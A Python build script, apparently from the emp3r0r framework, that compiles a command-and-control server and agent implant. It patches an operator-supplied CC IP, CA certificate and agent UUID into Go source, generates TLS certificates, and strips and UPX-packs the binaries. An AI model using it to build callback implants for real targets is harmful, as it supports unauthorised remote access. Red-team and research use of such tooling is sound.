#!/usr/bin/env python3

# pylint: disable=invalid-name, broad-except, too-many-arguments

'''
this script replaces build.sh, coz bash/sed/awk is driving me insane
'''

import glob
import os
import sys
import traceback
import uuid
import shutil


class GoBuild:
    '''
    all-in-one builder
    '''

    def __init__(self, target="cc",
                 cc_indicator="cc_indicator", cc_ip="10.103.249.16"):
        self.target = target
        self.GOOS = os.getenv("GOOS")
        self.GOARCH = os.getenv("GOARCH")

        if self.GOOS is None:
            self.GOOS = "linux"

        if self.GOARCH is None:
            self.GOARCH = "amd64"

        # tags
        self.CCIP = cc_ip
        self.INDICATOR = cc_indicator
        self.UUID = str(uuid.uuid1())
        f = open("./tls/rootCA.crt")
        self.CA = f.read()
        f.close()

    def build(self):
        '''
        cd to cmd and run go build
        '''
        self.set_tags()
        self.gen_certs()

        for f in glob.glob("./tls/emp3r0r-*pem"):
            shutil.copy(f, "./build")

        try:
            os.chdir(f"./cmd/{self.target}")
        except BaseException:
            return

        os.system(
            f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0 ''' +
            f'''go build -ldflags="-s -w" -o ../../build/{self.target}''')

        os.chdir("../../")
        os.system(f"upx -9 ./build/{self.target}")
        self.unset_tags()

    def gen_certs(self):
        '''
        generate server cert/key, and CA if necessary
        '''

        if os.path.exists("./build/ccip.txt"):
            f = open("./build/ccip.txt")

            if self.CCIP == f.read() and os.path.exists("./build/emp3r0r-key.pem"):
                f.close()
                return

            f.close()

        print("\u001b[33m[!] Generating new certs...\u001b[0m")
        os.chdir("./tls")
        os.system(
            f"bash ./genkey-with-ip-san.sh {self.UUID} {self.UUID}.com {self.CCIP}")
        os.rename(f"./{self.UUID}-cert.pem", "./emp3r0r-cert.pem")
        os.rename(f"./{self.UUID}-key.pem", "./emp3r0r-key.pem")
        os.chdir("..")

    def unset_tags(self):
        '''
        restore tags in the source

        - CA: emp3r0r CA, ./internal/tun/tls.go
        - CC indicator: check if CC is online, ./internal/agent/def.go
        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
        - CC IP: IP of CC server, ./internal/agent/def.go
        '''

        sed("./internal/tun/tls.go", self.CA, "[emp3r0r_ca]")
        sed("./internal/agent/def.go", self.CCIP, "10.103.249.16")
        sed("./internal/agent/def.go", self.INDICATOR, "[cc_indicator]")
        sed("./internal/agent/def.go", self.UUID, "[agent_uuid]")

    def set_tags(self):
        '''
        modify some tags in the source

        - CA: emp3r0r CA, ./internal/tun/tls.go
        - CC indicator: check if CC is online, ./internal/agent/def.go
        - Agent ID: UUID (tag) of our agent, ./internal/agent/def.go
        - CC IP: IP of CC server, ./internal/agent/def.go
        '''

        sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
        sed("./internal/agent/def.go", "10.103.249.16", self.CCIP)
        sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
        sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)


def clean():
    '''
    clean build output
    '''
    to_rm = glob.glob("./tls/emp3r0r*") + glob.glob("./tls/openssl-*") + \
        glob.glob("./build/*") + glob.glob("./tls/*.csr")

    for f in to_rm:
        try:
            os.remove(f)
            print("Deleted "+f)
        except BaseException:
            traceback.print_exc()


def sed(path, old, new):
    '''
    works like `sed -i s/old/new/g file`
    '''
    rf = open(path)
    text = rf.read()
    to_write = text.replace(old, new)
    rf.close()

    f = open(path, "w")
    f.write(to_write)
    f.close()


def yes_no(prompt):
    '''
    y/n?
    '''
    answ = input(prompt).lower().strip()

    if answ in ["y", "yes", "yea", "yeah"]:
        return True

    return False


def main(target):
    '''
    main main main
    '''
    ccip = "10.103.249.16"
    indicator = "[cc_indicator]"
    use_cached = False

    if target == "clean":
        clean()
        return

    # cc IP

    if os.path.exists("./build/ccip.txt"):
        f = open("./build/ccip.txt")
        ccip = f.read().strip()
        f.close()
        use_cached = yes_no("Use cached CC IP? [y/N] ")

    if not use_cached:
        ccip = input("CC server IP: ").strip()
        f = open("./build/ccip.txt", "w+")
        f.write(ccip)
        f.close()

    if target == "cc":
        gobuild = GoBuild(target="cc", cc_ip=ccip)
        gobuild.build()

        return

    if target != "agent":
        print("Unknown target")

        return

    # indicator

    use_cached = False
    if os.path.exists("./build/indicator.txt"):
        f = open("./build/indicator.txt")
        indicator = f.read().strip()
        f.close()
        use_cached = yes_no("Use cached CC indicator? [y/N] ")

    if not use_cached:
        indicator = input("CC status indicator: ").strip()
        f = open("./build/indicator.txt", "w+")
        f.write(indicator)
        f.close()

    gobuild = GoBuild(target="agent", cc_indicator=indicator, cc_ip=ccip)
    gobuild.build()


if len(sys.argv) != 2:
    print(f"python3 {sys.argv[0]} [cc/agent]")
    sys.exit(1)
try:
    main(sys.argv[1])
except KeyboardInterrupt:
    sys.exit(0)
